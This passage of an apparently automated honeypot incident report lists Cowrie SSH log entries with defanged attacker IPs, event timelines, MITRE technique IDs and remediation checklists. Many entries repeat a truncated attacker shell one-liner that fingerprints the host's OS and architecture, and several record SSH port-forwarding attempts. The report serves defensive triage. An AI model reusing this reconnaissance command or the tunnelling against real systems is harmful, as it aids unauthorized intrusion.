| `2026-07-26 08:10:31` | `cowrie.client.kex` |
| `2026-07-26 08:10:33` | `cowrie.login.success` |
| `2026-07-26 08:10:33` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.39.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.39.130[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a1cefe2ad7d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:11 |
| **Last Seen** | 2026-07-26 08:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:11:13` | `cowrie.session.connect` |
| `2026-07-26 08:11:14` | `cowrie.client.version` |
| `2026-07-26 08:11:14` | `cowrie.client.kex` |
| `2026-07-26 08:11:15` | `cowrie.login.success` |
| `2026-07-26 08:11:17` | `cowrie.session.params` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.success` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.command.input` |
| `2026-07-26 08:11:17` | `cowrie.log.closed` |
| `2026-07-26 08:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2963b05ae89

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:12 |
| **Last Seen** | 2026-07-26 08:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:12:50` | `cowrie.session.connect` |
| `2026-07-26 08:12:50` | `cowrie.client.version` |
| `2026-07-26 08:12:50` | `cowrie.client.kex` |
| `2026-07-26 08:12:52` | `cowrie.login.success` |
| `2026-07-26 08:12:54` | `cowrie.session.params` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.success` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.command.input` |
| `2026-07-26 08:12:54` | `cowrie.log.closed` |
| `2026-07-26 08:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4676d288361

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-07-26 08:13 |
| **Last Seen** | 2026-07-26 08:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:13:38` | `cowrie.session.connect` |
| `2026-07-26 08:13:39` | `cowrie.client.version` |
| `2026-07-26 08:13:39` | `cowrie.client.kex` |
| `2026-07-26 08:13:42` | `cowrie.login.success` |
| `2026-07-26 08:13:43` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb0809d911d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:14 |
| **Last Seen** | 2026-07-26 08:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:14:27` | `cowrie.session.connect` |
| `2026-07-26 08:14:28` | `cowrie.client.version` |
| `2026-07-26 08:14:28` | `cowrie.client.kex` |
| `2026-07-26 08:14:29` | `cowrie.login.success` |
| `2026-07-26 08:14:31` | `cowrie.session.params` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.success` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:31` | `cowrie.command.input` |
| `2026-07-26 08:14:32` | `cowrie.log.closed` |
| `2026-07-26 08:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765ce49a6534

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-07-26 08:14 |
| **Last Seen** | 2026-07-26 08:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:14:41` | `cowrie.session.connect` |
| `2026-07-26 08:14:42` | `cowrie.client.version` |
| `2026-07-26 08:14:42` | `cowrie.client.kex` |
| `2026-07-26 08:14:44` | `cowrie.login.success` |
| `2026-07-26 08:14:44` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2838abbdd81

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:16 |
| **Last Seen** | 2026-07-26 08:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:16:02` | `cowrie.session.connect` |
| `2026-07-26 08:16:02` | `cowrie.client.version` |
| `2026-07-26 08:16:02` | `cowrie.client.kex` |
| `2026-07-26 08:16:04` | `cowrie.login.success` |
| `2026-07-26 08:16:05` | `cowrie.session.params` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.success` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.command.input` |
| `2026-07-26 08:16:05` | `cowrie.log.closed` |
| `2026-07-26 08:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5cd8ed6da6e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:17 |
| **Last Seen** | 2026-07-26 08:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:17:36` | `cowrie.session.connect` |
| `2026-07-26 08:17:36` | `cowrie.client.version` |
| `2026-07-26 08:17:36` | `cowrie.client.kex` |
| `2026-07-26 08:17:38` | `cowrie.login.success` |
| `2026-07-26 08:17:40` | `cowrie.session.params` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.success` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:40` | `cowrie.command.input` |
| `2026-07-26 08:17:41` | `cowrie.log.closed` |
| `2026-07-26 08:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fcd5778bc18

| Field | Detail |
|---|---|
| **Source IP** | `85.159.164[.]28` |
| **First Seen** | 2026-07-26 08:17 |
| **Last Seen** | 2026-07-26 08:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:17:59` | `cowrie.session.connect` |
| `2026-07-26 08:17:59` | `cowrie.client.version` |
| `2026-07-26 08:17:59` | `cowrie.client.kex` |
| `2026-07-26 08:18:01` | `cowrie.login.success` |
| `2026-07-26 08:18:01` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.164[.]28` to AbuseIPDB if not already reported
- [ ] Block `85.159.164[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e9b772f06a7

| Field | Detail |
|---|---|
| **Source IP** | `85.159.164[.]28` |
| **First Seen** | 2026-07-26 08:18 |
| **Last Seen** | 2026-07-26 08:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:18:11` | `cowrie.session.connect` |
| `2026-07-26 08:18:11` | `cowrie.client.version` |
| `2026-07-26 08:18:11` | `cowrie.client.kex` |
| `2026-07-26 08:18:12` | `cowrie.login.success` |
| `2026-07-26 08:18:13` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.164[.]28` to AbuseIPDB if not already reported
- [ ] Block `85.159.164[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d643549c605

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:19 |
| **Last Seen** | 2026-07-26 08:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:19:11` | `cowrie.session.connect` |
| `2026-07-26 08:19:12` | `cowrie.client.version` |
| `2026-07-26 08:19:12` | `cowrie.client.kex` |
| `2026-07-26 08:19:13` | `cowrie.login.success` |
| `2026-07-26 08:19:15` | `cowrie.session.params` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.success` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.command.input` |
| `2026-07-26 08:19:15` | `cowrie.log.closed` |
| `2026-07-26 08:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b729fe7b8b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:20 |
| **Last Seen** | 2026-07-26 08:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:20:47` | `cowrie.session.connect` |
| `2026-07-26 08:20:47` | `cowrie.client.version` |
| `2026-07-26 08:20:47` | `cowrie.client.kex` |
| `2026-07-26 08:20:49` | `cowrie.login.success` |
| `2026-07-26 08:20:50` | `cowrie.session.params` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.success` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:50` | `cowrie.command.input` |
| `2026-07-26 08:20:51` | `cowrie.log.closed` |
| `2026-07-26 08:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28cfd69e2de3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 08:21 |
| **Last Seen** | 2026-07-26 08:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:21:10` | `cowrie.session.connect` |
| `2026-07-26 08:21:10` | `cowrie.client.version` |
| `2026-07-26 08:21:10` | `cowrie.client.kex` |
| `2026-07-26 08:21:10` | `cowrie.login.success` |
| `2026-07-26 08:21:10` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:21:10` | `cowrie.direct-tcpip.data` |
| `2026-07-26 08:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e913760473c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:22 |
| **Last Seen** | 2026-07-26 08:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:22:21` | `cowrie.session.connect` |
| `2026-07-26 08:22:22` | `cowrie.client.version` |
| `2026-07-26 08:22:22` | `cowrie.client.kex` |
| `2026-07-26 08:22:23` | `cowrie.login.success` |
| `2026-07-26 08:22:25` | `cowrie.session.params` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.success` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:25` | `cowrie.command.input` |
| `2026-07-26 08:22:26` | `cowrie.log.closed` |
| `2026-07-26 08:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86dc13ec44c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:23 |
| **Last Seen** | 2026-07-26 08:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:23:59` | `cowrie.session.connect` |
| `2026-07-26 08:23:59` | `cowrie.client.version` |
| `2026-07-26 08:23:59` | `cowrie.client.kex` |
| `2026-07-26 08:24:01` | `cowrie.login.success` |
| `2026-07-26 08:24:02` | `cowrie.session.params` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.success` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:02` | `cowrie.command.input` |
| `2026-07-26 08:24:03` | `cowrie.log.closed` |
| `2026-07-26 08:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7150596381bd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:25 |
| **Last Seen** | 2026-07-26 08:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
